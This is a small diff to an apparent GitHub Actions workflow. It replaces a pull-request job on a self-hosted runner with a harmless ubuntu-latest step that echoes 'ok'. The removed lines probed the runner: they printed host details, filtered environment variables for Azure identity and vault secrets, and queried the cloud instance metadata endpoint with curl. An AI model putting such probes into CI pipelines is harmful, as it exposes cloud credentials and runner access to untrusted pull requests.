@@ -3,13 +3,7 @@ on: pull_request
 permissions:
   contents: read
 jobs:
-  selfhosted:
-    runs-on: self-hosted
-    timeout-minutes: 3
+  noop:
+    runs-on: ubuntu-latest
     steps:
-      - run: |
-          echo "SELF-HOSTED RUNNER REACHED"
-          hostname; whoami; uname -a
-          env | sort | grep -iE "azure|identity|msi|client|tenant|subscription|vault" || true
-          echo "--- IMDS ---"
-          curl -s -m 8 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 1500 || true
+      - run: echo ok
